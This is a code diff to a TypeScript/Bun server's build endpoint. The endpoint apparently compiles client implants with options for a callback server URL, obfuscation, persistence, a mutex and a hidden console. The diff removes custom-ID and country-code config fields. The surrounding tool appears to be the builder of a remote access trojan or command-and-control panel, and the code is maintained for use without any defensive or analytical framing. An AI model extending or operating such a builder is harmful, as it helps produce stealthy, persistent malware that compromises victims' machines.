@@ -830,8 +830,6 @@ async function startBuildProcess(
     platforms: string[];
     serverUrl?: string;
     rawServerList?: boolean;
-    customId?: string;
-    countryCode?: string;
     mutex?: string;
     disableMutex?: boolean;
     stripDebug?: boolean;
@@ -911,21 +909,6 @@ async function startBuildProcess(
     
     
     let configJson = null;
-    if (config.customId || config.countryCode) {
-      configJson = {
-        id: config.customId || "",
-        hwid: "",
-        country: config.countryCode || "",
-        version: "1.0.0",
-      };
-      
-      const configDir = `${clientDir}/config`;
-      await Bun.$`mkdir -p ${configDir}`.quiet();
-      
-      const configPath = `${configDir}/settings.json`;
-      await Bun.write(configPath, JSON.stringify(configJson, null, 2));
-      sendToStream({ type: "output", text: `Created config file: ${configPath}\n`, level: "info" });
-    }
     
     
     const platformsToBuild = (config.platforms || []).filter((p) => ALLOWED_PLATFORMS.has(p));
@@ -2666,15 +2649,13 @@ async function startServer() {
             requirePermission(user, "clients:control");
             
             const body = await req.json();
-            const { platforms, serverUrl, rawServerList, customId, countryCode, stripDebug, disableCgo, obfuscate, enablePersistence, mutex, disableMutex, hideConsole } = body;
+            const { platforms, serverUrl, rawServerList, stripDebug, disableCgo, obfuscate, enablePersistence, mutex, disableMutex, hideConsole } = body;
             
             if (!platforms || !Array.isArray(platforms) || platforms.length === 0) {
               return Response.json({ error: "No platforms specified" }, { status: 400 });
             }
 
             
-            const safeCustomId = typeof customId === "string" && customId.length <= 64 ? customId : undefined;
-            const safeCountry = typeof countryCode === "string" && /^[A-Za-z]{2}$/.test(countryCode) ? countryCode.toUpperCase() : undefined;
             let safeMutex: string | undefined;
             try {
               safeMutex = typeof mutex === "string" ? sanitizeMutex(mutex) : undefined;
@@ -2716,7 +2697,7 @@ async function startServer() {
             });
             
             
-            startBuildProcess(buildId, { platforms: sanitizedPlatforms, serverUrl: safeServerUrl, rawServerList: safeRawServerList, customId: safeCustomId, countryCode: safeCountry, mutex: safeMutex, disableMutex: safeDisableMutex, stripDebug, disableCgo, obfuscate: !!obfuscate, enablePersistence, hideConsole: !!hideConsole });
+            startBuildProcess(buildId, { platforms: sanitizedPlatforms, serverUrl: safeServerUrl, rawServerList: safeRawServerList, mutex: safeMutex, disableMutex: safeDisableMutex, stripDebug, disableCgo, obfuscate: !!obfuscate, enablePersistence, hideConsole: !!hideConsole });
             
             return Response.json({ buildId });
           }
